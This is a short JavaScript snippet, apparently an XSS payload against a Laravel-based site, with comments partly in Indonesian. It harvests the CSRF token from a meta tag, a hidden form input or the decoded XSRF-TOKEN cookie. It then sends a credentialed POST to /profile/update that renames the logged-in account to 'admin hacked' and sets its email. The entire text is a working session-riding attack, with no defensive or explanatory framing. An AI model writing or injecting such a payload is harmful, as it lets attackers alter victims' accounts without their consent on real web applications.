(function () {
    // --------------------------
    // Helper: Get cookie value
    // --------------------------
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    // -----------------------------------------
    // 1. Attempt to get CSRF token from <meta>
    // -----------------------------------------
    let csrf = document.querySelector('meta[name="csrf-token"]')?.content;

    // --------------------------------------------------
    // 2. If not found, try hidden input name="_token"
    // --------------------------------------------------
    if (!csrf) {
        const inputToken = document.querySelector('input[name="_token"]');
        if (inputToken) csrf = inputToken.value;
    }

    // -------------------------------------------------------------------
    // 3. Fallback terakhir: decode cookie XSRF-TOKEN (Laravel enc format)
    // -------------------------------------------------------------------
    if (!csrf) {
        try {
            const xsrf = getCookie('XSRF-TOKEN');
            if (xsrf) {
                // Laravel menyimpan token dalam base64(JSON)
                const parsed = JSON.parse(atob(xsrf));
                csrf = parsed.value;
            }
        } catch (e) {
            // ignore jika gagal decode
        }
    }

    // Tidak dapat token → tidak lanjut
    if (!csrf) return;

    // ----------------------------------
    // Buat form-data sesuai request asli
    // ----------------------------------
    const fd = new FormData();
    fd.append('_token', csrf);
    fd.append('photo', new Blob([], { type: "application/octet-stream" }), "");  
    fd.append('name', "admin hacked");        // <-- perubahan yang diinginkan
    fd.append('email', "admin@themesbrand.com");
    fd.append('phone', "");

    // ---------------------------------------------
    // Kirim POST ke /profile/update (AJAX sama persis)
    // ---------------------------------------------
    fetch("/profile/update", {
        method: "POST",
        credentials: "include",
        headers: {
            "X-Csrf-Token": csrf,
            "X-Requested-With": "XMLHttpRequest"
        },
        body: fd
    }).catch(()=>{});
})();
